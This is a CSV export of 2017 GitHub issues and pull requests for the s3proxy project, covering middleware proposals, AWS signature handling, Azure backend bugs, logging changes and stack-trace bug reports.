gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/220,226693290,MDExOlB1bGxSZXF1ZXN0MTE5MjU5NjA2,220,Async response proof of concept,848247,open,FALSE,NA,NA,1,2017-05-05T21:12:27Z,2021-03-19T15:59:23Z,NA,OWNER,NA,This streams data during Get Object requests.  References #219.,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/220/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/220/comments,https://api.github.com/repos/gaul/s3proxy/issues/220/events,https://github.com/gaul/s3proxy/pull/220,https://api.github.com/repos/gaul/s3proxy/pulls/220
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/219,226693137,MDU6SXNzdWUyMjY2OTMxMzc=,219,Asynchronously stream data,848247,open,FALSE,NA,NA,0,2017-05-05T21:11:47Z,2017-05-05T21:13:48Z,NA,OWNER,NA,"S3Proxy could reduce its thread usage by asynchronously streaming data instead of synchronously copying it.  `BlobStore.getBlob` provides an `InputStream` which allows this but `BlobStore.putBlob` does not expose an `OutputStream` to write to, tracked by [JCLOUDS-769](https://issues.apache.org/jira/browse/JCLOUDS-769).  With both of these, we could use the standard async Servlet interface following the Jetty example here:

https://webtide.com/servlet-3-1-async-io-and-jetty/

@kishore25kumar @SpandanThakur related to your discussion on jclouds-dev.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/219/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/219/comments,https://api.github.com/repos/gaul/s3proxy/issues/219/events,https://github.com/gaul/s3proxy/issues/219,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/218,226665402,MDExOlB1bGxSZXF1ZXN0MTE5MjM5OTkz,218,Add read-only BlobStore middleware,848247,closed,FALSE,NA,NA,2,2017-05-05T19:09:47Z,2017-11-30T02:22:36Z,2017-11-30T02:22:36Z,OWNER,NA,"Implement as a proof-of-concept JavaScript middleware.  Requires JDK
8.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/218/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/218/comments,https://api.github.com/repos/gaul/s3proxy/issues/218/events,https://github.com/gaul/s3proxy/pull/218,https://api.github.com/repos/gaul/s3proxy/pulls/218
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/217,226501343,MDU6SXNzdWUyMjY1MDEzNDM=,217,Read-only middleware,848247,closed,FALSE,NA,NA,0,2017-05-05T08:08:38Z,2017-10-09T01:13:04Z,2017-10-09T01:13:04Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/217/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/217/comments,https://api.github.com/repos/gaul/s3proxy/issues/217/events,https://github.com/gaul/s3proxy/issues/217,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/216,226425519,MDU6SXNzdWUyMjY0MjU1MTk=,216,Immutable blob middleware,848247,open,FALSE,NA,NA,0,2017-05-04T22:23:33Z,2018-04-25T23:56:48Z,NA,OWNER,NA,"Protect against accidental overwrites or delete with an immutable blob middleware.  This implementation would do a HEAD before every PUT or DELETE request, denying the former if an object already exists.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/216/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/216/comments,https://api.github.com/repos/gaul/s3proxy/issues/216/events,https://github.com/gaul/s3proxy/issues/216,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/215,225676356,MDExOlB1bGxSZXF1ZXN0MTE4NTQxODg0,215,Fixed failing test in case of azure,3241357,closed,FALSE,NA,NA,1,2017-05-02T12:11:46Z,2017-05-03T12:29:10Z,2017-05-03T07:02:06Z,CONTRIBUTOR,NA,"For blob stores for which there is no blob access control, testHttpClient test is failing. For these blob stores by default getBlobAccess returns private. If a bucket is public then we should allow public access of the blob. This pull request fixes this issue",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/215/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/215/comments,https://api.github.com/repos/gaul/s3proxy/issues/215/events,https://github.com/gaul/s3proxy/pull/215,https://api.github.com/repos/gaul/s3proxy/pulls/215
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/214,225622821,MDExOlB1bGxSZXF1ZXN0MTE4NTA2MDMw,214,HTTP POST Requests using AWS Signature Version 4,950078,closed,FALSE,NA,NA,4,2017-05-02T08:17:13Z,2017-05-06T18:49:54Z,2017-05-05T19:11:55Z,CONTRIBUTOR,NA,"I tried to not to refactor the code. The only thing I refactored it the way how the fields are checked by adding the `isField` method and some convenient method to calculate HmacSHA1 / HmacSHA256 because they share code.

I also added CORS headers.

closes #212

Let me know what you think.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/214/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/214/comments,https://api.github.com/repos/gaul/s3proxy/issues/214/events,https://github.com/gaul/s3proxy/pull/214,https://api.github.com/repos/gaul/s3proxy/pulls/214
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/213,225591112,MDU6SXNzdWUyMjU1OTExMTI=,213,trace-level logs should include response status and headers,848247,open,FALSE,NA,NA,0,2017-05-02T05:02:30Z,2017-05-02T05:02:30Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/213/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/213/comments,https://api.github.com/repos/gaul/s3proxy/issues/213/events,https://github.com/gaul/s3proxy/issues/213,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/212,224361277,MDU6SXNzdWUyMjQzNjEyNzc=,212,V4 POST uploads,848247,closed,FALSE,NA,NA,2,2017-04-26T06:49:27Z,2017-05-05T19:11:55Z,2017-05-05T19:11:55Z,OWNER,NA,Presently this fails due to not parsing out and verifying the V4 signature.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/212/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/212/comments,https://api.github.com/repos/gaul/s3proxy/issues/212/events,https://github.com/gaul/s3proxy/issues/212,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/211,224248485,MDU6SXNzdWUyMjQyNDg0ODU=,211,s3proxy.virtual-host change causing Signature errors,381236,closed,FALSE,NA,NA,1,2017-04-25T19:35:08Z,2018-02-23T02:20:34Z,2017-04-25T20:06:05Z,NONE,NA,"The recent commit https://github.com/andrewgaul/s3proxy/commit/16af493cad28ab23c3c1abb128b4db3b405f25e9
caused all my builds to fail with 
`<autogenerated>:14: err: SignatureDoesNotMatch: Forbidden`

Can this change be made to default to a previous setup, or does a new env input need to be provided?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/211/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/211/comments,https://api.github.com/repos/gaul/s3proxy/issues/211/events,https://github.com/gaul/s3proxy/issues/211,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/210,224163581,MDExOlB1bGxSZXF1ZXN0MTE3NTAyODk1,210,Update docker script to allow for configuration of virtualhost,130230,closed,FALSE,NA,NA,1,2017-04-25T14:44:56Z,2017-04-25T20:02:08Z,2017-04-25T17:40:02Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/210/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/210/comments,https://api.github.com/repos/gaul/s3proxy/issues/210/events,https://github.com/gaul/s3proxy/pull/210,https://api.github.com/repos/gaul/s3proxy/pulls/210
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/209,218582788,MDU6SXNzdWUyMTg1ODI3ODg=,209,Shade jclouds (due to Guava),378614,closed,FALSE,NA,NA,3,2017-03-31T18:37:05Z,2018-02-22T08:34:27Z,2018-02-22T08:34:27Z,NONE,NA,"JClouds is stuck on an old version of Guava (16) which is incompatible with the latest version. That project hasn't settled on a compatibility strategy and [recommends](https://issues.apache.org/jira/browse/JCLOUDS-1225?focusedCommentId=15950333&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-15950333) that consumers shade it instead.

I'd like to use s3proxy in unit tests, but cannot due to this incompatibility.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/209/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/209/comments,https://api.github.com/repos/gaul/s3proxy/issues/209/events,https://github.com/gaul/s3proxy/issues/209,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/208,218195912,MDExOlB1bGxSZXF1ZXN0MTEzNDI3MjQ3,208,Use JCLOUDS_ENDPOINT and JCLOUDS_REGION in run-docker-container.sh,650430,closed,FALSE,NA,NA,2,2017-03-30T13:24:30Z,2017-03-30T16:02:22Z,2017-03-30T16:01:17Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/208/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/208/comments,https://api.github.com/repos/gaul/s3proxy/issues/208/events,https://github.com/gaul/s3proxy/pull/208,https://api.github.com/repos/gaul/s3proxy/pulls/208
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/207,218192836,MDExOlB1bGxSZXF1ZXN0MTEzNDI0OTcz,207,Update run-docker-container.sh,2950673,closed,FALSE,NA,NA,1,2017-03-30T13:13:55Z,2017-03-30T16:02:09Z,2017-03-30T16:02:09Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/207/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/207/comments,https://api.github.com/repos/gaul/s3proxy/issues/207/events,https://github.com/gaul/s3proxy/pull/207,https://api.github.com/repos/gaul/s3proxy/pulls/207
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/206,214902181,MDU6SXNzdWUyMTQ5MDIxODE=,206,InitiateMultipart is making two requests to azure,3241357,closed,FALSE,NA,NA,2,2017-03-17T04:01:02Z,2017-04-12T02:26:22Z,2017-04-12T02:26:22Z,CONTRIBUTOR,NA,"While using S3 proxy to connect to Azure backend store, the initiate multipart request is making two put blob requests to azure. Ideally, it should make one call on put blob. 
Here is the curl command I am trying the following curl command
```
curl --data """" http://127.0.0.1:9191/bucket-test/dc3295b2-2351-4fa7-b7b1-df0246cb07f7?uploads
```
Here is the charles proxy where it is showing two requests. Both requests are exactly similar

Request1

```
PUT /bucket-test/8490cba5-c3d3-4794-8ae9-1f1324260429 HTTP/1.1
x-ms-version: 2016-05-31
Expect: 100-continue
x-ms-blob-type: BlockBlob
Date: Fri, 17 Mar 2017 03:50:56 GMT
Authorization: 
User-Agent: s3proxy/null jclouds/2.1.0-SNAPSHOT java/1.8.0_91
Content-Type: application/x-www-form-urlencoded
Host: battula.blob.core.windows.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 0
```

Request2

```
PUT /bucket-test/8490cba5-c3d3-4794-8ae9-1f1324260429 HTTP/1.1
x-ms-version: 2016-05-31
Expect: 100-continue
x-ms-blob-type: BlockBlob
Date: Fri, 17 Mar 2017 03:50:56 GMT
Authorization: 
User-Agent: s3proxy/null jclouds/2.1.0-SNAPSHOT java/1.8.0_91
Content-Type: application/x-www-form-urlencoded
Host: battula.blob.core.windows.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-Length: 0
```

The same issue I am facing for list parts we are doing in proxy 

",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/206/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/206/comments,https://api.github.com/repos/gaul/s3proxy/issues/206/events,https://github.com/gaul/s3proxy/issues/206,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/205,214580611,MDU6SXNzdWUyMTQ1ODA2MTE=,205,V4 signature payload signing,848247,open,FALSE,NA,NA,0,2017-03-16T02:22:02Z,2017-03-16T02:22:02Z,NA,OWNER,NA,"Presently S3Proxy ignores chunk signatures in `ChunkedInputStream`.  Reference:

https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-streaming.html#sigv4-chunked-body-definition",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/205/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/205/comments,https://api.github.com/repos/gaul/s3proxy/issues/205/events,https://github.com/gaul/s3proxy/issues/205,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/204,214520146,MDU6SXNzdWUyMTQ1MjAxNDY=,204,Too much data after closed with authorization enabled,6540409,closed,FALSE,NA,NA,4,2017-03-15T20:45:31Z,2017-03-17T10:28:03Z,2017-03-17T02:39:22Z,NONE,NA,"Hi,

I am trying to integrate S3Proxy with [Signal-Server](https://github.com/WhisperSystems/Signal-Server). 

I am using the following configuration:

```
s3proxy.secure-endpoint=https://0.0.0.0:9000
s3proxy.authorization=aws_v4
s3proxy.identity=accessKey
s3proxy.credential=accessSecret
s3proxy.keystore-path=example.keystore
s3proxy.keystore-password=example
s3proxy.ignore-unknown-headers=true
s3proxy.ignore-unknown-parameters=true
jclouds.provider=filesystem
jclouds.filesystem.basedir=/opt/s3proxy/data
```

And I am getting the following warning when I try to upload a file:

`W 03-15 20:34:06.094 S3Proxy-18 o.e.jetty.http.HttpParser:1329 |::] badMessage: java.lang.IllegalStateException: too much data after closed for HttpChannelOverHttp@5e8e8a05{r=1,c=false,a=IDLE,uri=}`

After this message, the file is not written in the folder.

If I set authorization to none, everything works.

Do you have any idea why is this not working?
Has something to do with JClouds?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/204/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/204/comments,https://api.github.com/repos/gaul/s3proxy/issues/204/events,https://github.com/gaul/s3proxy/issues/204,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/203,214126527,MDExOlB1bGxSZXF1ZXN0MTEwNjU5OTk4,203,Error messages are now printed using logger.error instead of System.error,3241357,closed,FALSE,NA,NA,12,2017-03-14T16:19:53Z,2017-05-08T02:25:30Z,2017-05-08T02:25:30Z,CONTRIBUTOR,NA,Using logger for printing messages make it consistent. And it also makes sure all logs go through same logging configuration (logback.xml) which has the s3 prefix in it. Using println will bypass it.,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/203/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/203/comments,https://api.github.com/repos/gaul/s3proxy/issues/203/events,https://github.com/gaul/s3proxy/pull/203,https://api.github.com/repos/gaul/s3proxy/pulls/203
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/202,214017107,MDU6SXNzdWUyMTQwMTcxMDc=,202,InvalidLocationConstraint when creating bucket,3241357,closed,FALSE,NA,NA,4,2017-03-14T09:47:40Z,2018-08-02T00:31:41Z,2018-08-02T00:31:40Z,CONTRIBUTOR,NA,"We are using s3proxy to connect to azure storage. When we are creating a bucket using nodejs sdk I am getting InvalidLocationConstraint error. Here is the stack trace

```
{ InvalidLocationConstraint: The specified location constraint is not valid. For more information about Regions, see How to Select a Region for Your Buckets.
    at Request.extractError (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/services/s3.js:538:35)
    at Request.callListeners (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:105:20)
    at Request.emit (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:77:10)
    at Request.emit (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/request.js:668:14)
    at Request.transition (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/request.js:22:10)
    at AcceptorStateMachine.runTo (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/state_machine.js:14:12)
    at /Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/state_machine.js:26:10
    at Request.<anonymous> (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/request.js:38:9)
    at Request.<anonymous> (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/request.js:670:12)
    at Request.callListeners (/Users/battula/eloise/foundational-services/node-s3proxy/node_modules/aws-sdk/lib/sequential_executor.js:115:18)
  message: 'The specified location constraint is not valid. For more information about Regions, see How to Select a Region for Your Buckets.',
  code: 'InvalidLocationConstraint',
  region: null,
  time: 2017-03-14T09:40:15.509Z,
  requestId: null,
  extendedRequestId: undefined,
  cfId: undefined,
  statusCode: 400,
  retryable: false,
  retryDelay: 75.30141439047937 }
```
If I use java sdk it works fine. After a little debugging I found that if I pass region as azureblob while creating the bucket then it is working fine.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/202/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/202/comments,https://api.github.com/repos/gaul/s3proxy/issues/202/events,https://github.com/gaul/s3proxy/issues/202,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/201,213986347,MDU6SXNzdWUyMTM5ODYzNDc=,201,discrepancy with AWS S3 for non-utf8 key names ,1772540,open,FALSE,NA,NA,1,2017-03-14T07:14:06Z,2017-03-15T00:06:19Z,NA,COLLABORATOR,NA,"S3Proxy returns 404 when I try to HEAD a key that's not valid utf8, whereas aws returns 400. For ListObject, both return 403.

AWS S3:
```
2017/03/14 00:06:58 DEBUG: Request s3/HeadObject Details:
---[ REQUEST POST-SIGN ]-----------------------------
HEAD http://s3-us-west-2.amazonaws.com/zwryrjs2vjnu5su7/%AE%8A- HTTP/1.1
Host: s3-us-west-2.amazonaws.com
User-Agent: aws-sdk-go/1.0.0 (go1.7.5; linux; amd64)
Authorization: AWS4-HMAC-SHA256 Credential=AKIAJZP3GQRDDHSDPVOA/20170314/us-west-2/s3/aws4_request, SignedHeaders=host;x-amz-date, Signature=c2e525178f22ff31477cd2f39aa56b00e6ccbbd6e6c77512232db8ef2eb32884
X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
X-Amz-Date: 20170314T070658Z
-----------------------------------------------------
2017/03/14 00:06:58 DEBUG: Response s3/HeadObject Details:
---[ RESPONSE ]--------------------------------------
HTTP/1.1 400 Bad Request
Connection: close
Transfer-Encoding: chunked
Content-Type: application/xml
Date: Tue, 14 Mar 2017 07:06:58 GMT
Server: AmazonS3
X-Amz-Id-2: uTuLEkOBaQu+7qlioztYjl1AimGyhrK3E0g0LZCp0S9LgRLvy2CTOmVF3Dmv4BJ/YtvQWPr2q18=
X-Amz-Request-Id: CE60C5D3261F9937
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/201/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/201/comments,https://api.github.com/repos/gaul/s3proxy/issues/201/events,https://github.com/gaul/s3proxy/issues/201,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/200,213502921,MDU6SXNzdWUyMTM1MDI5MjE=,200,Anonymous access tests,848247,closed,FALSE,NA,NA,0,2017-03-11T03:51:06Z,2018-01-09T06:56:59Z,2018-01-09T06:56:59Z,OWNER,NA,Currently `AwsSdkTest` creates `S3Proxy` with v2 or v4 access.  We should add another test class to exercise anonymous access.  References #145 and #199.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/200/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/200/comments,https://api.github.com/repos/gaul/s3proxy/issues/200/events,https://github.com/gaul/s3proxy/issues/200,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/199,213299494,MDExOlB1bGxSZXF1ZXN0MTEwMDk4Mjk4,199,Test for issue 145,1654912,closed,FALSE,NA,NA,2,2017-03-10T10:15:00Z,2018-01-09T08:20:51Z,2017-03-11T03:51:22Z,NONE,NA,This is just a showcase for how to reproduce issue 145. **Please dont merge!**,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/199/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/199/comments,https://api.github.com/repos/gaul/s3proxy/issues/199/events,https://github.com/gaul/s3proxy/pull/199,https://api.github.com/repos/gaul/s3proxy/pulls/199
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/198,213101492,MDU6SXNzdWUyMTMxMDE0OTI=,198,How to stub a response,141136,closed,FALSE,NA,NA,1,2017-03-09T17:01:26Z,2017-03-14T23:29:08Z,2017-03-14T23:29:08Z,NONE,NA,I am using this library in a Java project and want to stub a response. Something like `do this when this happens`. Can you please point me to a documentation as to how to do it?,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/198/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/198/comments,https://api.github.com/repos/gaul/s3proxy/issues/198/events,https://github.com/gaul/s3proxy/issues/198,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/197,213008629,MDExOlB1bGxSZXF1ZXN0MTA5ODkyNTQy,197,Added log prefix in logback,3241357,closed,FALSE,NA,NA,0,2017-03-09T11:24:56Z,2017-03-10T10:50:21Z,2017-03-10T10:50:21Z,CONTRIBUTOR,NA,In distributed service environment this helps to distinguish s3proxy logs with other service logs. ,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/197/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/197/comments,https://api.github.com/repos/gaul/s3proxy/issues/197/events,https://github.com/gaul/s3proxy/pull/197,https://api.github.com/repos/gaul/s3proxy/pulls/197
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/196,212904200,MDU6SXNzdWUyMTI5MDQyMDA=,196,NullPointerException,141136,closed,FALSE,NA,NA,4,2017-03-09T00:56:49Z,2017-03-09T17:00:13Z,2017-03-09T17:00:13Z,NONE,NA,"I get a NPE when executing the code below for 1.5.1 and 1.5.2:

```java
        String endpoint = ""http://127.0.0.1:8085"";
        URI uri = URI.create(endpoint);
        Properties properties = new Properties();
        properties.setProperty(""s3proxy.authorization"", ""none"");
        properties.setProperty(""s3proxy.endpoint"", endpoint);
        properties.setProperty(""jclouds.provider"", ""filesystem"");
        properties.setProperty(""jclouds.filesystem.basedir"", ""/tmp/s3proxy"");

        ContextBuilder builder = ContextBuilder
                .newBuilder(""filesystem"")
                .credentials(""x"", ""x"")
                .modules(ImmutableList.<Module>of(new SLF4JLoggingModule()))
                .overrides(properties);
        BlobStoreContext context = builder.build(BlobStoreContext.class);
        BlobStore blobStore = context.getBlobStore();

        S3Proxy s3Proxy = S3Proxy.builder().awsAuthentication(AuthenticationType.AWS_V2, ""x"", ""x"").endpoint(uri).keyStore("""", """").blobStore(blobStore).build();
        s3Proxy.start();
```

```
java.lang.NullPointerException
	at org.gaul.s3proxy.S3Proxy.<init>(S3Proxy.java:77)
	at org.gaul.s3proxy.S3Proxy$Builder.build(S3Proxy.java:131)
	at org.gaul.s3proxy.S3Proxy$Builder$build$3.call(Unknown Source)
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:48)
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:113)
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:117)
	at DUMMY$_closure1.doCall(DUMMY.groovy:1)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:93)
	at org.codehaus.groovy.runtime.metaclass.ClosureMetaMethod.invoke(ClosureMetaMethod.java:84)
	at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:325)
	at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:1210)
	at groovy.lang.ExpandoMetaClass.invokeMethod(ExpandoMetaClass.java:1123)
	at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:1019)
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/196/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/196/comments,https://api.github.com/repos/gaul/s3proxy/issues/196/events,https://github.com/gaul/s3proxy/issues/196,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/195,212664855,MDU6SXNzdWUyMTI2NjQ4NTU=,195,testMultipartSynchronously failing with 'mvn test',6251748,closed,FALSE,NA,NA,1,2017-03-08T08:04:41Z,2017-03-08T22:14:24Z,2017-03-08T22:14:05Z,NONE,NA,"Hello,

I am trying to run `mvn test` but it is failing for following test case :
``JcloudsS3ClientLiveTest>S3ClientLiveTest.testMultipartSynchronously``

Here is the stack trace :
```
Caused by: java.lang.NullPointerException: lastModified
        at com.google.common.base.Preconditions.checkNotNull(Preconditions.java:229)
        at org.jclouds.s3.domain.ListMultipartUploadResponse.create(ListMultipartUploadResponse.java:38)
        at org.jclouds.s3.xml.PartIdsFromHttpResponseFull.endElement(PartIdsFromHttpResponseFull.java:70)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:609)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(XMLDocumentFragmentScannerImpl.java:1776)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2964)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:606)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:504)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:848)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:777)
        at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1213)
        at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:643)
        at org.jclouds.http.functions.ParseSax.doParse(ParseSax.java:140)
        at org.jclouds.http.functions.ParseSax.parse(ParseSax.java:129)
        ... 37 more


Results :

Failed tests:
  JcloudsS3ClientLiveTest>S3ClientLiveTest.testMultipartSynchronously:538 » Runtime
```
This is happening in both mac and windows. I have not changed any src code.
Any suggestions on how to resolve this?
Thanks ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/195/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/195/comments,https://api.github.com/repos/gaul/s3proxy/issues/195/events,https://github.com/gaul/s3proxy/issues/195,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/194,211884527,MDExOlB1bGxSZXF1ZXN0MTA5MTEwMzY5,194,Support service path,9978192,closed,FALSE,NA,NA,2,2017-03-04T15:04:20Z,2017-03-13T05:21:29Z,2017-03-12T23:55:50Z,CONTRIBUTOR,NA,"Sometimes service is not the only service under a domain(hostname). This work adds s3proxy.service-path to allow s3proxy to be deployed with a service path. The issues resolved by adding service path are 1) properly extract bucket and key, 2) properly validate signagure for authentication, 3) properly validate signagure for presigned url. Test cases are changed to run when s3proxy.service-path is set. ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/194/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/194/comments,https://api.github.com/repos/gaul/s3proxy/issues/194/events,https://github.com/gaul/s3proxy/pull/194,https://api.github.com/repos/gaul/s3proxy/pulls/194
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/193,211866547,MDExOlB1bGxSZXF1ZXN0MTA5MTAwMzI3,193,Add verification of override parameters for presigned url.,9978192,closed,FALSE,NA,NA,0,2017-03-04T08:47:02Z,2017-03-05T02:37:30Z,2017-03-05T01:16:40Z,CONTRIBUTOR,NA,Verify Content-Disposition and Content-Type header in response of pre-signed URL. ,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/193/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/193/comments,https://api.github.com/repos/gaul/s3proxy/issues/193/events,https://github.com/gaul/s3proxy/pull/193,https://api.github.com/repos/gaul/s3proxy/pulls/193
